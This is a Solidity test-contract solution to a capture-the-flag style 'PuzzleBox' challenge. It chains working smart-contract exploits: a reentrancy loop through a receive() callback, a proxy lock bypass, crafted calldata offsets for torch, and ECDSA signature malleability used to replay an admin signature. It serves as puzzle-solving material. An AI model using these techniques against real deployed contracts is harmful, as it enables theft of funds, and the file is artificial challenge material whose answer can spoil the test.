pragma solidity ^0.8.19;

import "./PuzzleBox.sol";
import "forge-std/Test.sol";

contract PuzzleBoxSolution is Test {
    function solve(PuzzleBox puzzle) external {
        // How close can you get to opening the box?

        console.log('lastDripId', puzzle.lastDripId());
        console.log('puzzle eth', address(puzzle).balance);

        Operate operate = new Operate(puzzle, address(this));

        console.log('operate', address(operate));
        console.log('Operate eth', address(operate).balance);

        console.log('puzzle', address(puzzle));
        console.log('puzzle.operator()', puzzle.operator());
        console.log('puzzle eth', address(puzzle).balance);

        operate.callDrip();
        console.log('Operate eth', address(operate).balance);
        console.log('Puzzle eth', address(puzzle).balance);
        console.log('Solution eth', address(this).balance);
        console.log('puzzle.operator()', puzzle.operator());
        console.log('new lastDripId', puzzle.lastDripId());
        console.log('dripCount', puzzle.dripCount());
        // for(uint256 i = 0; i <= 10; i++) {
        //     console.log('isValidDripId %s', i, puzzle.isValidDripId(i));
        // }

        puzzle.leak();
        payable(address(uint160(address(puzzle)) + uint160(2))).transfer(1);
        puzzle.zip();
        console.log('isValidDripId %s', 1, puzzle.isValidDripId(1));

        puzzle.creep{gas: 98000}();
        console.log('isValidDripId %s', 10, puzzle.isValidDripId(10));


        // uint256[] memory dripIds = new uint256[];
        // bytes memory encodedDripIds = abi.encode([1, 2]);//, 4, 6, 7, 8, 9
        uint256[] memory inputArray = new uint256[](6);
        inputArray[0] = 2;
        inputArray[1] = 4;
        inputArray[2] = 6;
        inputArray[3] = 7;
        inputArray[4] = 8;
        inputArray[5] = 9;
        // inputArray[6] = 9;
        bytes memory encodedDripIds = abi.encode(inputArray);
        console.log('encodedDripIdsLength', encodedDripIds.length);
        // puzzle.torch(encodedDripIds);
        (bool success,) = address(puzzle).call(abi.encodePacked(
                            puzzle.torch.selector, uint256(0x01), uint8(0), encodedDripIds));
        // (bool success,) = address(puzzle).call(abi.encodeWithSignature("torch(bytes)", encodedDripIds));
        require(success, "call failed");

        address payable[] memory friends = new address payable[](1);
        uint256[] memory friendsCutBps = new uint256[](3);
        friends[0] = payable(0x416e59DaCfDb5D457304115bBFb9089531D873B7);
        friendsCutBps[0] = uint160(bytes20(0xC817dD2a5daA8f790677e399170c92AabD044b57));
        friendsCutBps[1] = 0.015e4;
        friendsCutBps[2] = 0.0075e4;

        puzzle.spread(friends, friendsCutBps);
        console.log('isValidDripId %s', 3, puzzle.isValidDripId(3));
        console.log('Puzzle eth', address(puzzle).balance);

        console.log('admin', puzzle.admin());

        uint256 SECP256k1N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141;
        uint256 nonce = 0xc8f549a7e4cb7e1c60d908cc05ceff53ad731e6ea0736edf7ffeea588dfb42d8;
        uint256 r = uint256(0xc8f549a7e4cb7e1c60d908cc05ceff53ad731e6ea0736edf7ffeea588dfb42d8);
        uint256 s = SECP256k1N - uint256(0x625cb970c2768fefafc3512a3ad9764560b330dcafe02714654fe48dd069b6df);

        // bytes32 threshold = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141;
        // uint256 nonce = 0xc8f549a7e4cb7e1c60d908cc05ceff53ad731e6ea0736edf7ffeea588dfb42d8;
        // bytes32 r = 0xc8f549a7e4cb7e1c60d908cc05ceff53ad731e6ea0736edf7ffeea588dfb42d8;
        // bytes32 s_ = 0x625cb970c2768fefafc3512a3ad9764560b330dcafe02714654fe48dd069b6df;
        // bytes32 s = threshold - s_;

        console.logBytes32(bytes32(s));
        uint8 v = 27;
        bytes memory sign = abi.encodePacked(r, s, v);
        puzzle.open(nonce, sign);
    }
}

interface IPBProxy {
    function lock(bytes4 selector, bool isLocked) external;
}

contract Operate {
    PuzzleBox puzzle;
    address solution;
    uint256 counter;
    constructor(PuzzleBox _puzzle, address _solution) payable {
        puzzle = _puzzle;
        solution = _solution;
        puzzle.operate();
        IPBProxy(address(puzzle)).lock(bytes4(keccak256("torch(bytes)")), false);
    }

    function callDrip() external {
        puzzle.drip{value: 101}();
    }

    receive() external payable {
        if(counter < 9) {
            ++counter;
            puzzle.drip{value: 101}();
        } else {
            selfdestruct(payable(solution));
        }
    }
}


        // uint256[] memory inputArray2 = new uint256[](3);
        // inputArray2[0] = 1;
        // inputArray2[1] = 9;
        // inputArray2[2] = 10;
        // encodedDripIds = abi.encode(inputArray2);
        // puzzle.torch(encodedDripIds);

// contract A {
//     receive() external payable {}
// }

// contract AFactory {
//     bytes32 constant salt = 0x7e99dadb0f9c9a21a0b0a07907baea686b2a2b0f1c8e0e480a390be5c2f5a5a5;

//     function deployA() public {
//         bytes memory bytecode = type(A).creationCode;
//         assembly {
//             let addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)
//             if iszero(extcodesize(addr)) {
//                 revert(0, 0)
//             }
//         }
//     }

//     function computeAddress() public view returns (address) {
//         bytes32 codehash = keccak256(type(A).creationCode);
//         return address(uint160(uint(keccak256(abi.encodePacked(bytes1(0xff), address(this), salt, codehash)))));
//     }
// }

        // console.log('gasleft1', gasleft());
        // puzzle.zip{gas: 1000000}();
        // console.log('isValidDripId %s', 1, puzzle.isValidDripId(1));
        // console.log('Puzzle eth', address(puzzle).balance);
        // address nextAddr = 0x037eDA3aDb1198021A9b2e88C22B464fd38db3f4;

        // AFactory factory = new AFactory();
        // console.log('factory', address(factory));

        // // deployA();
        // console.log('deployedA', factory.computeAddress());
        // console.logBytes(type(A).creationCode);
        // console.log('next addr eth', nextAddr.balance);
        // console.log('codeLength', nextAddr.code.length);


// // Step 3: Zip
        // puzzle.zip();

        // // Step 4: Creep
        // puzzle.creep();

        // // Step 5: Spread
        // address payable[] memory friends = new address payable[](2);
        // uint256[] memory friendsCutBps = new uint256[](friends.length);
        // friends[0] = payable(0x416e59DaCfDb5D457304115bBFb9089531D873B7);
        // friends[1] = payable(0xC817dD2a5daA8f790677e399170c92AabD044b57);
        // friendsCutBps[0] = 0.015e4;
        // friendsCutBps[1] = 0.0075e4;
        // puzzle.spread(friends, friendsCutBps);

        // // Step 6: Open the puzzle
        // bytes memory adminSig = abi.encodePacked(
        //     hex"c8f549a7e4cb7e1c60d908cc05ceff53ad731e6ea0736edf7ffeea588dfb42d8",
        //     hex"625cb970c2768fefafc3512a3ad9764560b330dcafe02714654fe48dd069b6df",
        //     hex"1c"
        // );
        // puzzle.open(0xc8f549a7e4cb7e1c60d908cc05ceff53ad731e6ea0736edf7ffeea588dfb42d8, adminSig);


        // for(uint256 i = 1; i <= 572; i++) {
        //     puzzle.leak();
        // }
        // puzzle.creep();
        // for(uint256 i = 1; i <= 6; i++) {
        //     puzzle.leak();
        // }